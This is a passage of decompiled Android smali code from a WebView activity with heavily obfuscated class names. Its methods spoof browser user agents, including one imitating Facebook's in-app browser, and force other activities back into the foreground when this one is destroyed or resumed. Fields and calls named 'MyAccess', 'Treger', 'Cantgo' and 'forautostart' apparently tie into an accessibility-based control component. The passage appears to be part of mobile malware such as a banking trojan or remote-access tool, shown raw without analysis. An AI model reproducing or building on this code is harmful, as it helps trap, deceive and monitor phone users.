    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 986
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    sget-object v3, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 987
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setEnableSmoothTransition(Z)V

    .line 988
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    const/4 v3, -0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_e

    :catch_4
    nop

    .line 991
    :goto_e
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    const-string v2, ""

    .line 998
    iput-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->value:Ljava/lang/String;

    const-string v3, "google.com"

    .line 1000
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2a

    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->value:Ljava/lang/String;

    const-string v3, "youtube.com"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_29

    goto :goto_f

    .line 1008
    :cond_29
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const-string v3, "Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]"

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    goto :goto_10

    .line 1002
    :cond_2a
    :goto_f
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const-string v3, "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36"

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 1011
    :goto_10
    invoke-static/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->is_docegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53zemode(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_2b

    .line 1014
    :try_start_8
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/vskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb21;->isActivityOpen()Z

    move-result v2

    if-nez v2, :cond_2b

    .line 1015
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/vskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb21;

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x10000000

    .line 1016
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v3, 0x800000

    .line 1017
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1018
    invoke-virtual {v0, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->startActivity(Landroid/content/Intent;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    goto :goto_11

    .line 1021
    :catch_5
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->MyAccess:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;

    const-string v3, "battery"

    invoke-virtual {v2, v3, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->Treger(Ljava/lang/String;[Ljava/lang/String;)V

    .line 1025
    :cond_2b
    :goto_11
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$8;

    invoke-direct {v3, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$8;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    .line 1108
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyChrome;

    invoke-direct {v3, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyChrome;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 1109
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    new-instance v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyWebViewClient;

    invoke-direct {v3, v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$MyWebViewClient;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$1;)V

    invoke-virtual {v2, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 1143
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->value:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :goto_12
    return-void
.end method

.method protected onDestroy()V
    .locals 3

    .line 1243
    sget-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->echo:Z

    if-eqz v0, :cond_0

    .line 1246
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->AA:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->vkxpkmtknpxkyimkulrtdthirulmdzpbuczxqrvzkgbayryngh52(Ljava/lang/String;[B)V

    .line 1248
    :cond_0
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->isActivityOpen()Z

    move-result v0

    if-nez v0, :cond_1

    .line 1249
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 1250
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    .line 1251
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 1252
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 1254
    :cond_1
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 125
    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    .line 126
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    .line 128
    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method

.method protected onResume()V
    .locals 3

    .line 612
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 613
    sget-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->forautostart:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 614
    sput-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->forautostart:Z

    .line 615
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->Cantgo:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 618
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    .line 619
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 620
    invoke-virtual {p0, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->startActivity(Landroid/content/Intent;)V

    .line 622
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->finish()V

    :cond_0
    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    .line 115
    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    .line 116
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    .line 118
    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method
